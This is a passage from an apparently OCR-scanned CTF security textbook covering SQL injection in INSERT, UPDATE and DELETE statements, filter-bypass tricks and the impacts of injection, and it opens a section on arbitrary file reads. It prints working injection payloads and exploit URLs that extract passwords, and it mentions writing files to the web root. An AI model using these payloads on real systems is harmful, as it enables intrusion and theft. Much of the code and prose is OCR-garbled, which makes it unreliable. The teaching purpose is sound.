as follows.
INSERT INTO vp_user VALUES (1, 0, *1′) , (2, 1, *aaaa′) ;
An administrator user can be inserted if the second field of the user table
represents the administrator privilege ffag. In some cases, we can also insert data
into a field that can be displayed back to the user to get the data quickly. Assuming
that the data from the last field will be displayed on the page, the first user’s password
can be injected using the following statement.
INSERT INTO wp_user VALU&S (1, 1, *1*) , (2, 2, (SELECT pwd FROM vp_user
LIMIT 1)1 ;
1.2.2.3 UPDATE Injeetion
The UPDATE statement is used for updating database records, such as users
modifying their articles, personal information, etc. The syntax of the UPDATE
statement is as follows.
UPDATE [LOM_PRIORITY][IGNORE] table_reference
SET ass1gnment_list
[WHERE vhere_condition]
[ORDER BY .. .]
valwe:
[LIMIT rov_count]
---
## Page 46
1 Introduction to the Web
1d
Iuser
1pwd
adntn
23
thts is_the_adntn_password
NULL
222
NULL
nysql> update wp_user set
td=3
tere user ='23'
nysql> select *fron wp_users
OR
nysql>select*fron wp_user
>
td
Iuser
Ipwd
11
adntn
thts_is_the_adntn_password
NULL
23
222
NULL
Fig, 1.50 Result
{expr | DEFAULT}
assignment :
co1_name = value
assignment_1ist:
assigmment [, assignment] .
For example, let us take an example where the injection point is after SET. A
normal update statement is shown in Fig. 1.50, and you can see that the id-data in
line 2 of the original wp_user table has been modified.
When the id-data is controllable, it is possible to modify multiple fields of data, as
follows
UPDATE vp_user SET id=3, user= ′xoox′ HHERE user = 23′ ;
The methods to exploit the rest of the injection points are similar to injection
methods of SELECT statements.
---
## Page 47
1.2 SQL Injection in CTF
31
1.2.2.4  DELETE Injection
Most of the DELETE injections come after the WHERE keyword. Suppose the SQL
statement is as follows.
Sres = mysqli_query (Sconn, "DELETE FR.ON vp_nevs WHERE id = {S_GET
['id']}") ;
The purpose of the DELETE statement is to delete all data from a table or the
WHERE True, resulting in the entire wp_news data being deleted, see Fig. 1.51.
specified rows. Injecting the id parameter will inadvertently make the condition after
To ensure that there is no interference with normal data, it is common to use the
'and sleep(1) method to ensure that the condition of WHERE is False, preventing the
statement from being successfully executed, see Fig. 1.52.
1.2.3Injection and Defense
This section will cover common defenses and several ways to bypass them, focusing
on providing readers with ideas for bypasses.
1.2.3.1 Character Substitution
yoq no oedas Kdurs suadoaaap auos uooofu TOs isuese puajap on apro u
requests with keywords such as SELECT anxd FROM.
Fig, 1.51 Result
nysql> select * fron wp_news
td
|tttte |content |ttne |
1|2
13
14
14
rows tn set (e.00 sec)
nysql> delete fron wp_news where td=1or 1;
Query oK,2 rows affected (θ.θ8 sec)
ysql> select * fron wp_news
npty set (o.e0 sec)
---
## Page 48
1 Introduction to the Web
nysql>select * fron wp_news
td
|tttle |content |ttne
212
111
12
1
2
rows in set (o.ee sec)
ysql> delete fron wp_news where ld=1 and sleep(1);
Query OK,θ rows affected (1.1 sec)
lysql>select*fron wp_news
>
td
|title |content|tine|
111
2
2 rows tn set (o.06 sec)
Fig, 1.52 Result
1. filter spaces
In addition to spaces, %Oa, %Ob, %Oc, %Od, %09, %a0 (all URL-encoded, %a0 is
only available in certain character sets) and /**/ combinations, parentheses, etc. can
be substituted for spaces in the code. Suppose the PHP source code is as follows.
dud >
Sid = $_Ggr['id'] ;
Sconn = mysql1_connect (*127.0.0.1*, "root", *root", "test*) ;
Sid = str_replaee (*", **, Sid) ;
echo "before replace id: Sid*;
 // Renove spaces
echo "after replace id: $id*;
Ssq1 = *SEL&CT title, content FROM wp_news WHERE id=". Sid;
Sres = mysqli_query ($conn, Ssg1) :
Srow = mysqli_fetch_array ($res) :
echo "";
echo "", Srou[*title'] ." *;
echo "";
echo "#, Srou[°content′] . ";
echo ";
? >
The SQL query fails using the previous payload (see Fig. 1.53) because the space
is stripped, and the title is not shown on the page. Replace the space in payload with
“%09', The result could be seen in Fig. 1.54.
---
## Page 49
1.2 SQL Injection in CTF
不安全192.168.20.132/
201.2
before replace id: ~1 union select 1,2
after replace id: 1unionselect1,2
Fig, 1.53 Result
n%609select%09.
H
before replace id: 1 union select 1,2
after replace id: 1 union select 1,2
1
Fig, 1.54 Result
192.168.20.132/replace.php?id=-1%09t
before replace id: ~1 union selselectect 1,2
after replace id: ~1 union select 1,2
1
Fig, 1.55 Result
2. filter SELECT
In the case of replacing SELECT with null, you can use a nested form, such as
SESELECTLECT, which is filtered and then changed back to SELECT.
$id = str_replace (* ", "*, $id) ;
Replace with
Sid = str_replac
{*SELECT',
"", $id) ;
Visit http://192.168.20.132/replace.php?id-1%09union%09selselectect%091,2
and see Fig. 1.55 for the results.
---
## Page 50
1 Introduction to the Web
tltle,content fron wp_news;
title
content
thts ts tttle
1
2
2 rows tn set (o.o0 sec)
Fig, 1.56 Result
Fig, 1.57 Result
3. case matching
In MySQL, the keywords are not case sensitive, so if only *SELECT" is matched, it
can be easily bypassed by using mixed case, such as *sEleCT".
4. regular matching
The regular match keyword "bselectb" can be bypassed by using something like “/
*!50000select*/", see Fig. 1.56.
5. replaced single or double quotation marks, forgot the backslash
When the following injection points are encountered.
controllable 2'"
The following statements can be constructed to bypass the filter.
Ssgl = "SELECT + FROM wp_news WHERE id = 'a^\* AND tit1e = 'OR sleep (1) #'"
The backslash of the first controllable point escapes the single quotation mark
preset by controllable point 1, causing controllable point 2 to escape the single
quotation mark, see Fig. 1.57.
As you can see, sleep() was successfully executed, indicating that the Controlled
Point 2 location has successfully escaped the quotes. Sensitive information can be
obtained using UNION injection, see Fig. 1.58.
---
## Page 51
1.2 SQL Injection in CTF
35
tysgbsaseleetnafronwpnewsowhererednaand ttele 1uato
>
td
ttne
112
Fig, 1.58 Result
Fig, 1.59 Result
mysql>select *fron wp_user;
td
IusernaneIpassword
1|adnin
pJoMssed1
1 row in set （o.oo sec)
1.2.3.2 Escape Quotes
The critical point for the SQL injection is on escaping quotes, and developers often
do “addslashes" of the user's input globally, i.e., slashing characters such as single
quotes, backslashes, etc., such as "' to *". In this case, SQL injection may not seem
to exist, but it can still be broken under certain conditions.
1. Encoding and Decoding
Developers often use decoding functions such as urldecode, base64_decode, or
custom encryption/decryption functions. When the user enters the addslashes func-
tion, the data is encoded, and the quotes cannot be slashed, and if the input is
combined directly with the SQL statement after decoding, SQL injection can be
caused. The wide-byte injection is a classic case of injection caused by character set
conversion. Interested readers can consult the relevant documents to leam more.
2. Unexpected input points
For example, in PHP, the developer usually forgets variables such as the name of the
uploaded file, the HTTP header, and S_SERVER[°PHP_SELF°]. Thus there are no
filters to these variables, leading to injections.
3. secondary injection
The root cause of secondary injection is that the developer trusts that the data taken
out of the database is harmless. Suppose the current data table is shown in Fig. 1.59,
and the user name admin°or′1 entered by the user is escaped as admin\°or′1, so the
SQL statement is.
INSERT INTO wp_user VALUES [2, 'admin'or\'1', 'some_pass') ;
---
## Page 52
36
1 Introduction to the Web
nysql> tnsert tnto wp_user values(2,
Query 0K,1 row affected （0.01 sec)
.ssedawos..L.o.uwpe
ysql> select *fron wp_user;
id
|usernane
Ipassword
2 rows tn set (o.00 sec)
Fig, 1.60 Result
At this point, since the quotes are slashed, and no injection is generated, the data
is banked normally, see Fig. 1.60.
However, when this user name is used again (usually for session information), the
following code is shown.
When the name is combined into the SQL statement, it becomes as follows SQL
statement to produce SQL injection.
SELECT passvord FRoM vp_user WKERE username = *admin' or′1′ ;
4. String truncation
In header, title positions, etc., developers may limit headings to no more than
as follows.
10 characters, beyond which they will be truncated. For example, the PHP code is
dud >
Sconn = mysqli_connect (*127.0.0.1*, "root", *root", "test*) ;
Stitle = addslashes (S_G8r[*tit1e′] ) ;
Stitle = substz (Stitle1, 0, 10) ;
Scontent = addslashes (S_G&T [′content ']) ;
 μ, 
Ssql = "INSERT INTO wp_news VALUES [2, Stit1e*, Scontent′) * ;
Sres = mysqli_quezy (Sconn, Ssql) ;
---
## Page 53
1.2 SQL Injection in CTF
37
Fig, 1.61 Result
|tttte
1content
thts ts tttle
2
is in set (0.60 sec)
Fig, 1.62 Result
n:/usr/sbtn:/usr/sbtn/nologtn
r/sbtn/notogtn
s pqses Keogene st qqm eeeeeee, suou soxpre ue asoddns
which escapes the previous single quotes so that it can be injected at the content
place. Let us take the VALUES injection method and go to http://192.168.20.132/
insert2.php?title=aaaaaaaaa’&content,1,1),(3,4,
(select%
%wogo%psdo
20wp_user% 20limit%201),1)%23, you can see that two rows have been added to
the data table wp_news, see Fig. 1.61.
1.2.4Impacts ofInjection
We have covered the basics of SQL injection and ways to bypass it, so what are the
impacts of injection? The following is a summary of the author's experience in the
field.
• If you have the write permission, you can use INTO OUTFILE or DUMPFILE to
write directly to a web directory or write to a file and then combine it with a file
including vulnerabilities to achieve code execution, see Fig. 1.62.
• Use the load_file() function to read the source code and configuration information
with file read permission to access sensitive data.
• Elevate privileges, get higher user or administrator privileges, bypass logins, add
users, adjust user permissions, etc., to have more management functionality on 
the target website.
• Control the contents of files such as templates, caches, etc., to obtain permissions
or delete or read specific critical files by injecting data from database queries.
---
## Page 54
38
1 Introduction to the Web
▪ Control the entire database, including arbitrary data, arbitrary field lengths, etc.,
when multiple statements can be executed.
• System commands can be executed directly in a database such as SQL Server.
1.2.5SQLInjection Summary
This section introduces only some of the most straightforward points of the CTF,
while the actual competition will combine many features and functions. MySQL
injection challenges can use a variety of filtering methods, and due to the SQL server
in the implementation, even the same function can be implemented in a variety of
 uq pasn quoo aq nou pe sameaj apnpou m sasueqo a pue 'sem
crucial to look for relevant information according to the difrent SQL server types,
order to solve the challenges or to better understand SQL injection principles, it is
find out which fuzz methods filter out characters, functions, keywords, etc., look for
alternatives in the document that have the same function but do not contain filtering
keywords, and finally bypass the relevant defenses.
Some platforms like sqli-labs (https://github.com/Audi-1/sqli-labs) provide injec-
tion challenges with different filter levels, covering most challenge points. By
practicing and summarizing, we can always find the necessary combinations to
solve the challenges in the competition.
1.3Arbitrary File Read Vulnerability
The so-called file reading vulnerability means that the attacker can read the file on
the server that the developer does not allow the attacker to read through some means.
From the perspective of the entire attack process, it is often used as a powerful
supplementary method for asset information collection, various configuration files of
the server, keys stored in the form of files, server information (including information
about the processes being executed), historical commands, and network Information,
application source code, and binary programs are all snooped by attackers at the
trigger point of this vulnerability.
File reading vulnerabilities often mean that the attacker's server is about to be
wholly controlled by the attacker. Of course, if the server is deployed strictly
according to standard security specifications, even if there are exploitable file
reading vulnerabilities in the application, it is difficult for an attacker to obtain
valuable infommation. File reading vulnerabilities exist in almost every programming
Ianguage in which web applications can be deployed. Of course, the “existence" here
 q pasne uossuo ue inq as oenue a jo aqod e eusso jou s!
developer’s insufficient consideration of unexpected situations when developing.
Generally speaking, developers of web application frameworks or middleware
are very concermed about the reusability of the code, so the definition of some API
---
## Page 55
1.3 Arbitrary File Read Vulnerability
39
interfaces is very open to giving maximum freedom to the secondary developers as
much as possible. In real situations, many developers trust the security mechanism
implemented by the web application framework or middleware layer too much
during secondary development, and they recklessly rely on the security mechanism
of the application framework and middleware without a careful understanding of the
security mechanism. Simple API documentation is used for development. Unfortu-
nately, Web application frameworks or middleware developers may not indicate the
specific implementation principles of API functions, the range of acceptable param-
eters, and predictable security issues in the documentation.
The industry-recognized code base is usually called “wheels", and programs can
significantly reduce repetitive work using these “wheels". If there are vulnerabilities
in the “wheel", the “wheel" code will be repeatedly reused by programmers multiple
times at the same time, the vulnerabilities will also be passed level by level, and with
the constant reference to the underlying “wheel code, there will The security risks in
the “wheel° code are almost invisible to developers at the top of the *call chain".
It is also a severe challenge for security personnel to patiently trace the call chain
backward to its root cause as they dig into web application framework
vulnerabilities.
In addition, there is an arbitrary file reading vulnerability that developers cannot
control through code. The vulnerability in this situation is often caused by the Web
Server’s problems or insecure server configuration. The primary mechanism of Web